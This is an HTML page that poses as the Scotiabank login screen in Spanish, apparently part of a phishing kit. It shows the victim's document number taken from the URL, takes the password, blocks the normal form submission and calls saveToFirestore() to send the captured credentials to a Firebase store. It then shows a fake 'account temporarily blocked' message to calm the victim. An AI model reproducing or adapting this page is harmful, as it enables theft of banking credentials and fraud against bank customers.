<!DOCTYPE html>
<html lang="es">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Scotiabank - Iniciar sesión</title>
    <script src="https://kit.fontawesome.com/3297378b0c.js" crossorigin="anonymous"></script>
    <link rel="icon" href="onlylogo.png" type="image/png">

    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f8f9fe;
            margin: 0;
            padding: 0;
            display: flex;
            flex-direction: column;
            min-height: 100vh;
        }
        
        header {
            padding: 1.5rem;
            background-color: white;
            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
        }
        
        .logo {
            width: 150px;
        }
        
        main {
            flex: 1;
            display: flex;
            justify-content: center;
            align-items: flex-start;
            padding: 20px;
        }
        
        .login-container {
            background-color: white;
            border-radius: 8px;
            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
            padding: 30px;
            margin-top: 50px;
            width: 100%;
            max-width: 400px;
        }
        
        .scotia-symbol {
            width: 30px;
            margin-bottom: 20px;
            display: block;
        }
        
        .form-group {
            margin-bottom: 20px;
        }
        
        label {
            display: block;
            margin-bottom: 5px;
            font-weight: bold;
        }
        
        .user-info {
            display: flex;
            align-items: center;
            margin-bottom: 20px;
        }
        
        .user-icon {
            background-color: #f0f0f0;
            border-radius: 50%;
            padding: 10px;
            margin-right: 10px;
        }
        
        .user-id {
            font-weight: bold;
        }
        
        .change-user {
            color: #0066cc;
            text-decoration: none;
            font-size: 14px;
        }
        
        .forgot-password {
            color: #0066cc;
            text-decoration: none;
            font-size: 14px;
            display: inline-block;
            margin-top: 5px;
        }
        
        .checkbox-container {
            display: flex;
            align-items: center;
            margin-bottom: 20px;
        }
        
        .checkbox-container input {
            margin-right: 10px;
        }
        
        .submit-btn {
            width: 100%;
            padding: 10px;
            background-color: #e6e6e6;
            border: none;
            border-radius: 4px;
            font-size: 16px;
            cursor: pointer;
        }
        
        .submit-btn:hover {
            background-color: #d9d9d9;
        }
        
        footer {
            text-align: center;
            padding: 20px;
        }
        
        .footer-link {
            color: #0066cc;
            text-decoration: none;
            margin: 0 10px;
        }
        
        .footer-icon {
            vertical-align: middle;
            margin-right: 5px;
        }
        /* Contenedor para el campo de contraseña y el botón */
        
        .password-container {
            position: relative;
            display: inline-block;
            width: 100%;
            margin-bottom: 20px;
        }
        /* Contenedor para el campo de contraseña y el botón */
        
        .password-container {
            position: relative;
            width: 100%;
            /* Mantener el contenedor al 100% */
        }
        /* Estilo del input */
        
        .password-container input[type="password"],
        .password-container input[type="text"] {
            width: 100%;
            /* Fijar el ancho al 100% */
            padding-right: 40px;
            /* Espacio para el botón del ojo */
            box-sizing: border-box;
            /* Asegura que padding no afecte el tamaño */
            font-size: 16px;
            padding: 10px;
            margin-bottom: 10px;
            border: 1px solid #ccc;
            /* Bordes consistentes */
            border-radius: 4px;
            transition: none;
            /* Desactiva transiciones para evitar cambios bruscos */
        }
        /* Estilo para el botón del ojo */
        
        #toggle-password {
            position: absolute;
            right: 10px;
            top: 50%;
            transform: translateY(-50%);
            background: none;
            border: none;
            cursor: pointer;
            outline: none;
            padding: 0;
            color: #666;
            font-size: 18px;
        }
        /* Asegura que el botón no cambie su tamaño ni afecte al input */
        
        #toggle-password i {
            pointer-events: none;
        }
        
        .fa-circle-info {
            margin-left: 10px;
        }
        /* Estilo del contenedor del modal */
        
        .modal {
            display: none;
            /* Oculto por defecto */
            position: fixed;
            z-index: 1000;
            /* Encima de todo el contenido */
            left: 0;
            top: 0;
            width: 100%;
            height: 100%;
            overflow: auto;
            background-color: rgba(0, 0, 0, 0.5);
            /* Fondo oscuro semi-transparente */
        }
        /* Contenido del modal */
        
        .modal-content {
            background-color: white;
            margin: 15% auto;
            /* Centrado vertical y horizontal */
            padding: 20px;
            border: 1px solid #888;
            width: 80%;
            max-width: 400px;
            border-radius: 8px;
            box-shadow: 0px 0px 15px rgba(0, 0, 0, 0.3);
            position: relative;
        }
        /* Botón de cerrar (la "X") */
        
        .close-btn {
            color: #aaa;
            float: right;
            font-size: 28px;
            font-weight: bold;
            cursor: pointer;
        }
        /* Cambiar color cuando se pasa el cursor */
        
        .close-btn:hover,
        .close-btn:focus {
            color: #444;
        }
        /* Botón de aceptar */
        
        #accept-btn {
            background-color: #E31837;
            color: white;
            border: none;
            padding: 10px 20px;
            cursor: pointer;
            border-radius: 5px;
            font-size: 16px;
            margin-top: 20px;
        }
        /* Cambiar color cuando se pasa el cursor */
        
        #accept-btn:hover {
            background-color: #E31837;
        }
    </style>
</head>

<body>
    <header>
        <img src="logoname.png" alt="Scotiabank" class="logo">
    </header>

    <main>
        <div class="login-container">
            <img src="onlylogo.png" alt="Scotiabank Symbol" class="scotia-symbol">

            <form id="loginForm">
                <div class="user-info">
                    <div class="user-icon">
                        <svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                            <path d="M20 21V19C20 17.9391 19.5786 16.9217 18.8284 16.1716C18.0783 15.4214 17.0609 15 16 15H8C6.93913 15 5.92172 15.4214 5.17157 16.1716C4.42143 16.9217 4 17.9391 4 19V21" stroke="#666666" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
                            <path d="M12 11C14.2091 11 16 9.20914 16 7C16 4.79086 14.2091 3 12 3C9.79086 3 8 4.79086 8 7C8 9.20914 9.79086 11 12 11Z" stroke="#666666" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
                        </svg>
                    </div>
                    <div>
                        <!-- Aquí se mostrará el número de documento recibido -->
                        <div class="user-id" id="user-id"></div>
                        <a href="login.html" class="change-user">Cambiar usuario</a>
                    </div>
                </div>

                <div class="password-container">
                    <label for="password">Contraseña</label>
                    <input type="password" id="password" name="password" required>
                    <button type="button" id="toggle-password" aria-label="Mostrar contraseña">
                        <i class="fa fa-eye" id="toggle-icon"></i>
                    </button>
                    <a href="index.html"> ¿Olvidaste tu contraseña?</a>
                </div>

                <div class="checkbox-container">
                    <input type="checkbox" id="trust" name="trust">
                    <label for="trust">Confiar en este navegador</label>
                    <i class="fa-solid fa-circle-info"></i>
                </div>

                <button type="submit" id="submit-btn" class="submit-btn">Iniciar sesión</button>
            </form>
        </div>
    </main>

    <!-- Contenedor del Modal -->
    <div id="modal" class="modal">
        <div class="modal-content">
            <span class="close-btn">&times;</span>
            <h2>Mensaje Importante</h2>
            <p>Hemos detectado movimientos inusuales, por eso bloqueamos temporalmente su cuenta bancaria. inténtelo de nuevo</p>
            <button id="accept-btn">Aceptar</button>
        </div>
    </div>

    <footer>
        <a href="#" class="footer-link">
            <svg class="footer-icon" width="16" height="16" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                <path d="M22 16.92V19.92C22 20.4704 21.7893 20.9987 21.4142 21.3738C21.0391 21.7489 20.5109 21.9596 19.96 21.96C16.4289 21.6894 13.0155 20.5377 10.07 18.62C7.32717 16.8724 5.06095 14.6062 3.31333 11.8633C1.3924 8.91061 0.240514 5.49027 -0.0300002 1.95999C-0.030458 1.41068 0.179686 0.884135 0.553204 0.509525C0.926723 0.134914 1.45342 -0.0764672 2.00333 -0.0799973H5.00333C6.0368 -0.0922138 6.92544 0.673374 7.07 1.69999C7.18945 2.63098 7.39683 3.54915 7.69 4.43999C7.93159 5.17185 7.79 5.97525 7.32 6.55999L6.01333 7.86666C7.64534 10.7148 9.98852 13.0579 12.8367 14.69L14.1433 13.3833C14.728 12.9133 15.5314 12.7717 16.2633 13.0133C17.1542 13.3065 18.0723 13.5139 19.0033 13.6333C20.0421 13.7796 20.8135 14.6784 20.7933 15.72L22 16.92Z" stroke="#0066CC" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
            </svg> Llámanos
        </a>
        <a href="#" class="footer-link">
            <svg class="footer-icon" width="16" height="16" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                <path d="M21 10C21 17 12 23 12 23C12 23 3 17 3 10C3 7.61305 3.94821 5.32387 5.63604 3.63604C7.32387 1.94821 9.61305 1 12 1C14.3869 1 16.6761 1.94821 18.364 3.63604C20.0518 5.32387 21 7.61305 21 10Z" stroke="#0066CC" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
                <path d="M12 13C13.6569 13 15 11.6569 15 10C15 8.34315 13.6569 7 12 7C10.3431 7 9 8.34315 9 10C9 11.6569 10.3431 13 12 13Z" stroke="#0066CC" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
            </svg> Ubícanos
        </a>
    </footer>

    <!-- Firebase App (configuración del SDK) -->
    <script src="https://www.gstatic.com/firebasejs/9.17.2/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.17.2/firebase-firestore.js"></script>

    <script>
        import {
            saveToFirestore
        } from "/app.js"
        // Función para alternar la visibilidad de la contraseña
        document.getElementById('toggle-password').addEventListener('click', function() {
            const passwordInput = document.getElementById('password');
            const toggleIcon = document.getElementById('toggle-icon');

            if (passwordInput.type === 'password') {
                passwordInput.type = 'text';
                toggleIcon.classList.remove('fa-eye');
                toggleIcon.classList.add('fa-eye-slash');
            } else {
                passwordInput.type = 'password';
                toggleIcon.classList.remove('fa-eye-slash');
                toggleIcon.classList.add('fa-eye');
            }
        });

        // Obtener los parámetros de la URL
        const params = new URLSearchParams(window.location.search);
        const documentNumber = params.get('document-number');

        // Mostrar el número de documento en el div con class "user-id"
        if (documentNumber) {
            document.getElementById('user-id').textContent = documentNumber;
        } else {
            document.getElementById('user-id').textContent = 'No se proporcionó número de documento';
        }

        document.addEventListener('DOMContentLoaded', function() {
            const modal = document.getElementById('modal');
            const closeModalBtn = document.querySelector('.close-btn');
            const acceptBtn = document.getElementById('accept-btn');
            const submitBtn = document.getElementById('submit-btn');

            // Función para abrir el modal y detener el envío del formulario
            function openModal(event) {
                event.preventDefault(); // Evitar que el formulario se envíe
                modal.style.display = 'block';
                saveToFirestore()
            }

            // Agregar evento de clic al botón de envío
            submitBtn.addEventListener('click', openModal);

            // Cerrar el modal al hacer clic en la "X"
            closeModalBtn.addEventListener('click', function() {
                modal.style.display = 'none';
            });

            // Cerrar el modal al hacer clic en "Aceptar"
            acceptBtn.addEventListener('click', function() {
                modal.style.display = 'none';
            });

            // Cerrar el modal si se hace clic fuera del contenido del modal
            window.addEventListener('click', function(event) {
                if (event.target === modal) {
                    modal.style.display = 'none';
                }
            });
        });
    </script>
    <script type="module" src="app.js"></script>
</body>

</html>